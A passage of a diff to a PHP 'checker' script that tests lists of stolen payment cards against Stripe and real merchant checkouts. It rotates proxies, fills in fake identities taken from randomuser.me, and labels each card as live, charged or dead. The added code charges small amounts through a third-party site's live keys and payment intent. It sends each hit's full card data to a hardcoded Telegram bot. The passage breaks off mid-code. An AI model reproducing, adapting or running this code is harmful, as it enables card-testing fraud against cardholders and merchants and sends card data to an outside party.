@@ -1,334 +1,411 @@
-<?php
 
-/*
-/@======@@======@@=@@=@@===@@=====@@======@@@@@@==@@====@@=@@=@@@@@@@@====@@============@/
-/@======@@=@===@@@=@@=@@=@@======@@@@====@@=====@=@@====@@=@@====@@======@@@@===========@/
-/@======@@==@=@=@@=@@=@@@@======@@==@@==@@========@@@@@@@@=@@====@@=====@@==@@==========@/
-/@======@@===@==@@=@@=@@=@@====@@=@@=@@==@@@@@@@==@@@@@@@@=@@====@@====@@=@@=@@=========@/
-/@======@@======@@=@@=@@==@@===@@====@@=@======@@=@@====@@=@@====@@====@@====@@=========@/
-/@======@@======@@=@@=@@===@@==@@====@@==@@@@@@@==@@====@@=@@====@@====@@====@@=========@/
-*/
-
-/*=========================================================================*/
+<?php 
 error_reporting(0);
-ini_set('display_errors', 0);
+//---------------------------------------//
+$mtc_site = "https://deepdive.servicedaccommodationsecrets.com/membership-account/membership-checkout" ;
+$amo = "1$" ;
+//---------------------------------------//
 
-/*=========================================================================*/
-
-/*=========================================================================*/
-$start_time = microtime(true);
-$lista = $_GET['lista'];
-$gateway = "STRIPE AUTH";
-/*=========================================================================*/
-
-/*=========================================================================*/
-$functions = new Functions();
-if($functions->hasaccess() === false){$functions->redirect_location();}
-$httpheaders = $functions->httpheaders();
-if (empty($httpheaders['sec'])) {die('where is the key?<br>');} 
-$zmikashita = new ZMikashita();
-$secret_key = $httpheaders['sec'];
-/*=========================================================================*/
-
-/*=========================================================================*/
-$i = explode("|", $lista);
-$cc = isset($i[0]) ? $i[0] : null;
-$mm = isset($i[1]) ? $i[1] : null;
-$yyyy = isset($i[2]) ? $i[2] : null;
-if(strlen($yyyy) == 2){
-	$yyyy = "20".$yyyy;
+$update = file_get_contents('php://input');
+$update = json_decode($update, TRUE);
+$print = print_r($update);
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+    extract($_POST);
+} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
+    extract($_GET);
 }
-$yy = substr($yyyy, 2, 4);
-$cvv = isset($i[3]) ? $i[3] : null;
-$bin = substr($cc, 0, 6);
-$last4 = substr($cc, 12, 16);
-$email = $functions->emailGenerate();
-$m = ltrim($mm, "0");
-/*=========================================================================*/
+;
 
-/*=========================================================================*/
-if($cc == null || $mm == null || $yyyy==null || $cvv==null)
+//==================[Randomizing Details]======================//
+$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
+preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
+$name = $matches1[1][0];
+preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
+$last = $matches1[1][0];
+preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
+$email = $matches1[1][0];
+preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
+$street = $matches1[1][0];
+preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
+$city = $matches1[1][0];
+preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
+$state = $matches1[1][0];
+preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
+$phone = $matches1[1][0];
+preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
+$postcode = $matches1[1][0];
+//==================[Randomizing Details-END]======================//
+
+function GetStr($string, $start, $end) {
+    $str = explode($start, $string);
+    $str = explode($end, $str[1]);  
+    return $str[0];
+}
+function inStr($string, $start, $end, $value) {
+    $str = explode($start, $string);
+    $str = explode($end, $str[$value]);
+    return $str[0];
+}
+$separa = explode("|", $lista);
+$cc = $separa[0];
+$mes = $separa[1];
+$ano = $separa[2];
+$cvv = $separa[3];
+
+function rebootproxys()
 {
-   $end_time = microtime(true);
-   $execution_time = $end_time - $start_time;
-   $execution_time = number_format($execution_time, 2);
-   echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Invalid Card.</span><br>Time Taken: '.$execution_time.'s<br><br>';
-   exit();
+  $poxySocks = file("proxy.txt");
+  $myproxy = rand(0, sizeof($poxySocks) - 1);
+  $poxySocks = $poxySocks[$myproxy];
+  return $poxySocks;
 }
-/*=========================================================================*/
+$poxySocks4 = rebootproxys();
 
-/*=========================================================================*/
-$lookup = new BinLookup();
-$cc_country = $lookup->issuingCountry();
-$cc_bname = $lookup->issuingBank();
-$cc_type0 = $lookup->cardType();
-$cc_type1 = $lookup->cardSubType();
-$cc_type2 = $lookup->cardCategory();
-$binlookup = "BIN INFO: $cc_type0 - $cc_type1 - $cc_type2<br>BANK: $cc_bname<br>COUNTRY: $cc_country";
-/*=========================================================================*/
+$number1 = substr($ccn,0,4);
+$number2 = substr($ccn,4,4);
+$number3 = substr($ccn,8,4);
+$number4 = substr($ccn,12,4);
+$number6 = substr($ccn,0,6);
 
-/*=========================================================================*/
-$identity = new GenerateIdentity('au');
-$name_first = $identity->first_name();
-$name_last =  $identity->last_name();
-$name_full = "$name_first $name_last";
-$location_street = $identity->location_street();
-$location_city = $identity->location_city();
-$location_postcode = $identity->location_postcode();
-$location_state =$identity->location_state_iso();
-/*=========================================================================*/
-
-$item_descriptions = array(
-  1 => 'Cablecar Ticket',
-  2 => 'Apartment Reservation Ticket',
-  3 => 'Entrance Reservation Ticket',
-  4 => 'Ski Reservation Ticket',
-  5 => 'Gears Reservation Ticket'
-    ); 
-$item_description = $item_descriptions[array_rand($item_descriptions)];
-/*=========================================================================*/
-
-/*=========================================================================*/
-$retry_count = 0;
-/*=========================================================================*/
-
-/*=========================================================================*/
-while(true){
-	$curl_1 = curl_init();
-	curl_setopt($curl_1, CURLOPT_CONNECTTIMEOUT,15);
-	curl_setopt($curl_1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-	curl_setopt($curl_1, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($curl_1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv.'&card[name]='.$name_first.'+'.$name_last.'&card[address_line1]='.$location_street.'&card[address_city]='.$location_city.'&card[address_state]='.$location_state.'&card[address_zip]='.$location_postcode.'&card[address_country]='.$location_country);
-	curl_setopt($curl_1, CURLOPT_USERPWD, $secret_key. ':' . '');
-	$headers = array();
-	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-	curl_setopt($curl_1, CURLOPT_HTTPHEADER, $headers);
-	$curl_1_exec = curl_exec($curl_1);
-	curl_close($curl_1);
-	if (strpos($curl_1_exec, "rate_limit"))   
-	{  
-		$retry_count++;  
-		continue;  
-	}  
-	break; 
+function value($str,$find_start,$find_end)
+{
+    $start = @strpos($str,$find_start);
+    if ($start === false) 
+    {
+        return "";
+    }
+    $length = strlen($find_start);
+    $end    = strpos(substr($str,$start +$length),$find_end);
+    return trim(substr($str,$start +$length,$end));
 }
-$result_1 = json_decode($curl_1_exec, true);
-/*=========================================================================*/
 
-/*=========================================================================*/
-if(isset($result_1['error'])){
-	$code = $result_1['error']['code'];
-	$decline_code = $result_1['error']['decline_code'];
-	$message = $result_1['error']['message'];
-	if(isset($result_1['error']['decline_code'])){
-		$codex = $decline_code;
-	}else{
-		$codex = $code;
-	}
-	
-	$err = ''.$result_1['error']['message'].' [ '.strtoupper($codex).' ]';
-	if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-check" aria-hidden="true"></i>CCN LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'.</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-        echo '<span><i class="fa fa-check" aria-hidden="true"></i>CVV LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'.</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: TestMode Charges. [ SK ERROR ][ DEAD SK ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif(strpos($curl_1_exec, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Integration Error. [ SK ERROR ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif(strpos($curl_1_exec, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Verify Phone Number. [ SK ERROR ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}else{
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}
-	exit();
+function mod($dividendo,$divisor)
+{
+    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
 }
-/*=========================================================================*/
+# -------------------- [1 REQ] -------------------#
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: api.stripe.com',
+'method: POST',
+'path: /v1/payment_methods h2',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-site',
+'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
-/*=========================================================================*/
-if(!isset($result_1['id'])){
-    $end_time = microtime(true);
-    $execution_time = $end_time - $start_time;
-    $execution_time = number_format($execution_time, 2);
-    die('<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Client not found</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>');
+# ----------------- [1req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=9193c518-36f8-43e6-a8d5-0635e27df2b19c1a96&muid=f87af78d-396f-4929-8df7-9c82b9a764ea486ea3&sid=e2185dd5-6151-4eae-86e6-b3de7009a6510d7a31&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730&time_on_page=58115&key=pk_live_OC4ftTyuGNtAcLvMnh7Fz889&_stripe_account=acct_1HaHgQGvI1equNqy');
+
+
+
+
+$result1 = curl_exec($ch);
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+#$pi = Getstr($result1,'client_secret":"','_secret');
+
+#$src = Getstr($result1,'client_secret":"','"');
+# -------------------- [2 REQ] -------------------#
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3MZJK6H5tvrIOuhg0qXpxfqu/confirm');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: galleryclimatecoalition.org',
+'method: POST',
+'path: /cart/stripe_create_confirm_payment_intent/ HTTP/1.1',
+'scheme: https',
+'accept: application/json, text/javascript, */*; q=0.01',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'origin: https://galleryclimatecoalition.org',
+'referer: https://galleryclimatecoalition.org/store/basket/?checkout-step=3',
+'sec-fetch-dest: document',
+'sec-fetch-mode: navigate',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36',));
+
+# ----------------- [2req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=c4e477b1-b918-4df6-8e6d-97c9a11074296fdc74&payment_method_data[sid]=NA&payment_method_data[payment_user_agent]=stripe.js%2F8992977ce%3B+stripe-js-v3%2F8992977ce&payment_method_data[time_on_page]=59332&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51ItC1RH5tvrIOuhgVjfPI8H2RyYylygZsFipr1OBwdKnJJV39dSPWJHG3nrMrJCoWqdCAPGJP3BN6VofQm0jHHjT00YhV39opU&client_secret=pi_3MZJK6H5tvrIOuhg0qXpxfqu_secret_cuSiJBbGzbj13DfRNNG5h2mZP');
+
+
+
+
+
+
+
+$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+
+
+
+$result2 = curl_exec($ch);
+# ---------------------------------------#
+
+
+# ---------------- [Responses] ----------------- #
+if(strpos($result2, "payment_intent_unexpected_state")) {
+
+
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';
+
+    }
+
+elseif(strpos($result2, "succeeded")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV CHARGED 1$✅ 💯 @NOVA_PVT_LTD</span><br> <br>';
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ sifat 1$💥 ✅";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+exit;
 }
-if(!isset($result_1['card']['id'])){
-    $end_time = microtime(true);
-    $execution_time = $end_time - $start_time;
-    $execution_time = number_format($execution_time, 2);
-    die('<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Client not found</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>');
+
+elseif(strpos($result2, "Your card has insufficient funds.")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED:'.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+    
+    
+    exit;
+    }
+
+
+
+elseif(strpos($result2, "incorrect_zip")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅  💯 @NOVA_PVT_LTD</span><br>';
+    exit;
+    }
+    
+    elseif(strpos($result2, "Your card has insufficient funds.")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:CVV CHARGED '.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
+    
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ Charged 1$ ✅";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+    
+    
+    exit;
+    }
+
+elseif(strpos($result2, 'security code is incorrect.')) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED: '.$amo.' ✅ 💯 @NOVA_PVT_LTD</span><br>';
+    
+    $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+    
+    
+    exit;
+    }
+    elseif(strpos($result2, 'security code is invalid.')) {
+
+        echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CCN CHARGED '.$amo.'✅ 💯 @NOVA_PVT_LTD</span><br>';
+        
+        $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ✅";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+        
+        
+        
+        exit;
+        }
+    elseif(strpos($result2, "Security code is incorrect")) {
+
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>Result:CNN CHARGED ✅ 💯 @NOVA_PVT_LTD </span><br>';
+    
+      $tg2 = 
+" 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
+
+𝗖𝗖 ➔  <code>".$lista."</code>
+𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➔ CCN Charged 1$ ☑️";
+
+$apiToken = '6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE'; //Bot Api Token, You get it from BotFather
+$forward1 = ['chat_id' => '5646865373','text' => $tg2,'parse_mode' => 'HTML' ];
+$response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
+      
+      
+      
+    }
+    
+elseif(strpos($result2, "transaction_not_allowed")) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅ 💯 @NOVA_PVT_LTD</span><br>';
+    exit;
+    }
+    
+
+elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
+
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅ 💯 @NOVA_PVT_LTD </span><br>';
+    exit;
+    }
+elseif(strpos($result2, "generic_decline")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';
+    }
+
+elseif(strpos($result2, "do_not_honor")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';
+
 }
-/*=========================================================================*/
 
-/*=========================================================================*/
-$src_id = $result_1["id"];
-/*=========================================================================*/
 
-/*=========================================================================*/
-while(true){
-	$curl_2 = curl_init();
-	curl_setopt($curl_2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
-	curl_setopt($curl_2, CURLOPT_RETURNTRANSFER, 1);
-	curl_setopt($curl_2, CURLOPT_POST, 1);
-	curl_setopt($curl_2, CURLOPT_POSTFIELDS, 'name='.$name_first.'+'.$name_last.'&email='.$email.'&description='.$item_description.'&source='.$src_id.'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]='.$location_country);
-	curl_setopt($curl_2, CURLOPT_USERPWD, $secret_key . ':' . '');
-	$headers = array();
-	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-	curl_setopt($curl_2, CURLOPT_HTTPHEADER, $headers);
-	$curl_2_exec = curl_exec($curl_2);
-	curl_close($curl_2);
-	if (strpos($curl_2_exec, "rate_limit"))   
-	{  
-		$retry_count++;  
-		continue;  
-	}  
-	break; 
+elseif(strpos($result2, "fraudulent")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';
+
 }
-$result_2 = json_decode($curl_2_exec, true);
-/*=========================================================================*/
+elseif(strpos($result2, "intent_confirmation_challenge")) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ </span><br>';
+
+    }
 
 
-/*=========================================================================*/
-if (isset($result_2['error'])) {
-		//DEAD
-	$code = $result_2['error']['code'];
-	$decline_code = $result_2['error']['decline_code'];
-	$message = $result_2['error']['message'];
-	if(isset($result_2['error']['decline_code'])){
-		$codex = $decline_code;
-	}else{
-		$codex = $code;
-	}
-	$err = ''.$result_2['error']['message'].' [ '.strtoupper($codex).' ]';
-	if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-check" aria-hidden="true"></i>CCN LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'.</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-check" aria-hidden="true"></i>CVV LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'.</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: TestMode Charges. [ SK ERROR ][ DEAD SK ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif(strpos($curl_2_exec, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Integration Error. [ SK ERROR ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}elseif(strpos($curl_2_exec, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Verify Phone Number. [ SK ERROR ].</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}else{
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: '.$err.'</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}
-	exit();
+elseif(strpos($result2, 'Your card was declined.')) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
 }
-/*=========================================================================*/
 
-/*=========================================================================*/
-if (isset($result_2['sources'])) {
-	$cvc_result_2 = $result_2['sources']['data'][0]['cvc_check'];
-	if($cvc_result_2 == "pass"||$cvc_result_2 == "success"){
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-check" aria-hidden="true"></i>CVV LIVE</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: [ CVC_CHECK ][ '.strtoupper($cvc_result_2).' ]</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}else{
-		$end_time = microtime(true);
-		$execution_time = $end_time - $start_time;
-		$execution_time = number_format($execution_time, 2);
-		echo '<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: [ CVC_CHECK ][ '.strtoupper($cvc_result_2).' ]</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>';
-	}
-	exit();
+elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {
+
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline </span><br>';
 }
-if(!isset($result_2['id'])){
-	$end_time = microtime(true);
-    $execution_time = $end_time - $start_time;
-    $execution_time = number_format($execution_time, 2);
-    die('<span><i class="fa fa-times" aria-hidden="true"></i>DEAD</span>  <span>:  '.$lista.'</span>  <br>GATEWAY: '.$gateway.' <br>RESULT: Client not found</span><br>RETRY: [ '.$retry_count.' ]<br>'.$binlookup.'<br>Time Taken: '.$execution_time.'s<br><br>');
+
+elseif(strpos($result2, '"cvc_check": "pass"')) {
+
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span><br>Result:CVV CHECK PASS ✅  </span><br>';
+exit;
 }
-/*=========================================================================*/
 
-/*=========================================================================*/
-$customer_ID = $result_2['id'];
-$card_ID = $result_1['card']['id'];
-/*=========================================================================*/
+elseif(strpos($result2, "Membership Confirmation")) {
 
-/*=========================================================================*/
-while(true){
-	$curl_3 = curl_init();
